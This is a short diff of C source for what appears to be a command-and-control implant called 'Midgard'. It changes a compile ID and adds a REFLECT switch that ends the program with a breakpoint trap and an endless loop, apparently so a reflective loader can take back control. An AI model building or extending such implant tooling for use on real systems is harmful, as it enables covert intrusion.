@@ -7,6 +7,7 @@
 #include "agent_functions/command_header.h"
 #include "agent_functions/function_header.h"
 #include "cjson/cJSON.h"
+#define REFLECT 1
 
 // Constants
 #define QUEUE_DEPTH 2 // Small because I only need it for hostname
@@ -142,7 +143,7 @@ int main() {
     profile->uuid = uuid;
     profile->path = "/v3/api/register";  // Register endpoint
     profile->agent = "Midgard";
-    profile->compile_id = strdup("36f2b820-0f00-491c-b1fc-72216feeca5a");
+    profile->compile_id = strdup("a87b8031-b8c3-49a8-91b4-8ed6d6af83e6");
     profile->reg = (int *)1;
     profile->aes = (int *)1;
 
@@ -167,7 +168,6 @@ int main() {
     profile->reg = 0;
 
     // Clean up variables
-    // explicit_bzero(tmp_user, strlen(tmp_user));
     explicit_bzero(user, strlen(user));
     explicit_bzero(profile->compile_id, strlen(profile->compile_id));
     free(profile->compile_id);
@@ -241,5 +241,19 @@ int main() {
     free(profile->iv);
     free(host);
     free(profile);
-    _exit(0);
+    
+    if (REFLECT == 1) {
+        #if defined(__aarch64__)
+            __asm__ volatile("brk #0");
+        #elif defined(__x86_64__)
+            __asm__ volatile("int3");
+        #else
+            _exit(0);
+        #endif
+
+        while(1); // Fail safe
+    } else {
+        _exit(0);
+    }
+    
 }
